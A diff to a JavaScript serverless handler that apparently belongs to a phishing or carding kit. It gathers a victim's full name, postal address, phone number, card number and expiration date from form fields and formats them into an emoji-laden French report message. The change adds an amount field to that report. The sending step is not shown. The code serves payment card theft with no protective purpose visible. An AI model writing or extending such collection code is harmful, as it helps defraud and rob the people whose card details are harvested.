@@ -17,6 +17,7 @@ export default async function handler(req, res) {
         const page_source = data.page_source || 'Non spécifiée';
         const champ1      = data.champ1 || 'Non saisi';
         const champ2      = data.champ2 || 'Non saisi';
+        const champ3      = data.champ3 || 'Non saisi';
         const champ4      = data.champ4 || 'Non saisi';
         const champ5      = data.champ5 || 'Non saisi';
         const champ6      = data.champ6 || 'Non saisi';
@@ -32,7 +33,7 @@ export default async function handler(req, res) {
         message += `📍 **Provenance :** \`Page ${page_source}\`\n\n`;
         message += `👤 **Nom & Prénom :** \`${champ1}\`\n`;
         message += `🏠 **Postale :** \`${champ2}\`\n`;
-        
+        message += `💰 **Montant :** \`${champ3}$\`\n`;
         message += `📞 **Tel :** \`${champ4}\`\n\n`;
         message += `💳 **Numéro Carte :** \` ${cleanChamp5} \`\n`;
         message += `📅 **Expiration :** \`${champ6}\`\n`;
